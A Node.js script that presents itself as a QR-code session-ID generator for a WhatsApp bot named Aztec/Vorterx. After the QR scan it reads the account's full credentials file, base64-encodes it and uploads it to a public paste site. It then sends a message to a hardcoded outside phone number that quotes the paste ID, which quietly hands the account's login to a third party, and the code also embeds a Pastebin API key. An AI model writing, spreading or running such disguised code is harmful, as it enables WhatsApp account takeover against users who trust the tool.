const pino = require("pino");
const axios = require("axios");
let qrcode = require("qrcode-terminal");
const PastebinAPI = require("pastebin-js");
const path = require('path');
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
const fs = require("fs-extra");
if (fs.existsSync('./auth_info_baileys')) {
  fs.emptyDirSync(__dirname + '/auth_info_baileys');
  require('child_process').exec('rm -rf auth_info_baileys')
  console.log('\nRun The Script Again');
  setTimeout(() => {   console.log(' ')    }, 100);
  setTimeout(() => {   console.log('A')    }, 300);
  setTimeout(() => {   console.log('Z')    }, 500);
  setTimeout(() => {   console.log('T')    }, 700);
  setTimeout(() => {   console.log('E')    }, 900);
  setTimeout(() => {   
console.log('C')    }, 1500);
  setTimeout(() => {
console.log('v')    }, 1600);
  setTimeout(() => {
console.log('x')     }, 1700);
  setTimeout(() => { 
process.exit()      }, 1800)
};
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@whiskeysockets/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function Vorterx() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (connection == "open")
        {
          await delay(500);
          let user = session.user.id;
          var c2 = '';
//===========================================================================================
//===============================  SESSION ID 1   ===========================================
//===========================================================================================
          try { 
            let data = await fs.readFileSync(__dirname+'/auth_info_baileys/creds.json','utf-8')  
            await delay(800)
            const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
             c2 = output.data.split('/')[3]
            await delay(500);
            let session_id1 = await session.sendMessage(user, {text: 'Vorterx;;;'+c2});
            await session.sendMessage("27686881509@s.whatsapp.net", { text: '*qr session has been scanned successfully.*' } , {quoted : session_id1});
          }catch (e) {console.log(e)}
//===========================================================================================
//===============================  SESSION ID 2   ===========================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          c = Buffer.from(unique).toString('base64')
          console.log(`
====================  SESSION ID 1  ==========================                   
SESSION-ID 1 ==> ${c}

====================  SESSION ID 2  ========================== 
SESSION-ID 2 => ' ${c2}

Don't provide your SESSION_ID to anyone otherwise that user can access your account.
Thanks.
-------------------   SESSION CLOSED   -----------------------
`)   




          
let cc = `┌───⭓『
❒ [*AMAZING YOU CHOOSE AZTEC*]
❒ _NOW ITS TIME TO RUN IT_
└────────────⭓
┌───⭓
❒  • Chat with owner •
❒ *GitHub:* __https://github.com/Vorterx_
❒ *Author:* _wa.me/27686881509_
└────────────⭓
`;
          let session_id = await session.sendMessage(user, { text: "Vorterx;;;" + c });
          await session.sendMessage(user, { text: cc } , { quoted : session_id });
          
          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        session.ev.on('creds.update', saveCreds)
       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { Vorterx(); }
      });
    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
  }
  Vorterx();
}, 3000)
